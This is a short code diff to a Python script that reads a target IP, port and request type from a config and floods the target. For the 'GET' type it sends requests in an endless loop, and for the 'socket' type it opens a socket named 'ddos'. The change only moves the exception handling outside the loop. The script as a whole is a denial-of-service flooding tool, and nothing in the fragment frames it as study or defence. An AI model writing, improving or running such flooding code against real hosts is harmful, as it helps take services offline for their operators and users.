@@ -18,11 +18,11 @@ message = config["message"]
 type = config["type"]
 
 if type == "GET":
-    while True:
-        try:
+    try:
+        while True:
             r.get(f"{ip}:{port}")
-        except Exception as e:
-           print(e)
+    except Exception as e:
+       print(e)
 elif type == "socket":
     ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
